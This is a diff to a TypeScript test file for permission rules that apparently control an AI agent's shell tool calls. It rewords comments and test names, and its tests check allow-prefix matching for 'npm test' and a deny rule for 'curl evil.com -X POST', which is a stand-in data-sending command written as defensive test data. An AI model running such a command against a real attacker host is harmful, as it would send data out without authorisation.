@@ -6,11 +6,7 @@ function vote(spec: string, kind: "allow" | "deny", call: { toolName: string; ar
   return rule.match(call);
 }
 
-/**
- * Command rules are matched against the PERSISTED args tools actually store:
- * the full command string (no redaction — owner decision). `bashArgs` mirrors
- * what tools-shell's persistArgs emits.
- */
+/** Command rules are matched against the full invocation arguments. */
 const bashArgs = (raw: string) => ({ toolName: "Bash", args: { command: raw } });
 
 describe("project permission rule specs", () => {
@@ -19,7 +15,7 @@ describe("project permission rule specs", () => {
     expect(vote("Read", "allow", { toolName: "Edit", args: {} })).toBe("skip");
   });
 
-  it("Bash(npm test) prefix-matches the persisted full command, not all npm", () => {
+  it("Bash(npm test) prefix-matches the full command, not all npm", () => {
     expect(vote("Bash(npm test)", "allow", bashArgs("npm test"))).toBe("allow");
     expect(vote("Bash(npm test)", "allow", bashArgs("npm test -- -u"))).toBe("allow");
     expect(vote("Bash(npm test)", "allow", bashArgs("npm install"))).toBe("skip");
@@ -27,7 +23,7 @@ describe("project permission rule specs", () => {
     expect(vote("Bash(npm test)", "allow", bashArgs("npm publish"))).toBe("skip");
   });
 
-  it("Bash deny rules keep working against the persisted full command", () => {
+  it("Bash deny rules keep working against the full command", () => {
     expect(vote("Bash(curl evil.com)", "deny", bashArgs("curl evil.com -X POST"))).toBe("deny");
     expect(vote("Bash(curl evil.com)", "deny", bashArgs("curl docs.example.com"))).toBe("skip");
   });
